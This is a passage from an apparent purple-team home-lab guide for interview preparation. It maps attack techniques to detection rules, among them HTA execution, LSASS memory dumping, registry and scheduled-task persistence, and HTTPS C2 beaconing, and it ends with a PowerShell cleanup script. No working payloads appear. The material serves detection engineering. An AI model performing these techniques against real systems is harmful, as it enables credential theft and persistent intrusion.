  ✅ Was the MITRE technique ID correctly mapped?
  ❌ If no alert → GAP → Write a new custom rule
  ⚠️  If alert but low severity → TUNE → Adjust rule level
```

---

## Phase 5: How to Talk About This in the Interview

### Key Talking Points by Job Requirement

**"Strong understanding of cyber threat techniques, intelligence analysis, and adversary TTPs"**
> "In my home lab, I execute full attack chains that mirror real-world adversary behavior. For example, I recently simulated a Cobalt Strike-style intrusion using Havoc C2 — starting with an HTA-based initial access vector, establishing persistence through registry Run keys and scheduled tasks, performing credential access via LSASS memory dumping, and maintaining C2 over encrypted HTTPS. Each technique maps directly to MITRE ATT&CK, and I validate detection coverage at every step."

**"Familiarity with MITRE ATT&CK and similar threat frameworks"**
> "I use ATT&CK as the backbone of my purple team exercises. My CALDERA deployment is built around ATT&CK adversary profiles — I create custom profiles that chain techniques in realistic sequences and then validate which steps my detection stack catches. I also use Atomic Red Team for isolated technique testing when I want to validate a single detection rule."

**"Experience designing log ingestion and aggregation strategies"**
> "I designed the log ingestion pipeline for my purple team lab from scratch. The Windows endpoints run Sysmon with Olaf Hartong's modular config, shipping Sysmon Operational logs, PowerShell Script Block logs, and Windows Security events to Wazuh via the agent. I tuned which event channels to collect based on detection value — for example, PowerShell Script Block Logging (Event 4104) is essential for catching encoded commands, while Sysmon Event 10 is critical for LSASS access detection."

**"Experience configuring and utilizing enterprise SIEM platforms"**
> "I run Wazuh as my SIEM and have written custom detection rules that go beyond the default ruleset. For example, I created a rule that detects non-system processes accessing LSASS memory by correlating Sysmon Event 10 data, filtering out known-good processes like csrss and MsMpEng. I also built frequency-based rules that detect C2 beaconing patterns — if a non-browser process makes more than 5 HTTPS connections in 60 seconds, that triggers an investigation."

**"No Prior Experience with ASV Required" — But you can connect the dots:**
> "While I haven't used Mandiant Security Validation specifically, the workflow is identical to what I do with CALDERA and Atomic Red Team in my lab. I build adversary emulation plans mapped to ATT&CK, execute them against instrumented targets, validate whether my detection stack catches each technique, and then close gaps with custom rules or tuning. That attack-validate-improve cycle is exactly what ASV delivers at enterprise scale, and I'm excited to bring that hands-on experience to the platform."

---

## Quick Reference: Attack → Detect → Rule

| Attack Step | Tool Used | Sysmon Event | Windows Event | Wazuh Custom Rule |
|-------------|-----------|-------------|---------------|-------------------|
| HTA Execution | Havoc | Event 1 (mshta→powershell) | 4688 | Parent-child anomaly |
| PowerShell Cradle | Havoc | Event 1, Event 3 | 4104 | Script block analysis |
| Registry Persistence | Havoc/ART | Event 12/13 | 4657 | Rule 100300 |
| Scheduled Task | Havoc/ART | Event 1 | 4698 | Schtasks from temp dir |
| Process Injection | Havoc | Event 8 | — | Rule 100200 |
| LSASS Dump | Havoc/ART | Event 10 | 4663 | Rule 100100/100101 |
| Discovery Commands | Havoc/CALDERA | Event 1 (burst) | 4688 | Frequency-based rule |
| HTTPS Beaconing | Havoc | Event 3 | — | Rule 100400 |

---

## Cleanup Checklist

After the exercise, reset your lab:
```powershell
# On Windows target
# Remove persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\UpdateCheck" /f

# Remove payloads
Remove-Item "$env:TEMP\update.exe" -Force
Remove-Item "C:\temp\*.dmp" -Force

# Clean up Atomic Red Team artifacts
Invoke-AtomicTest T1547.001 -Cleanup
Invoke-AtomicTest T1053.005 -Cleanup
Invoke-AtomicTest T1003.001 -Cleanup

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Uninstall Sysmon (if needed)
C:\Tools\Sysmon\Sysmon64.exe -u
```
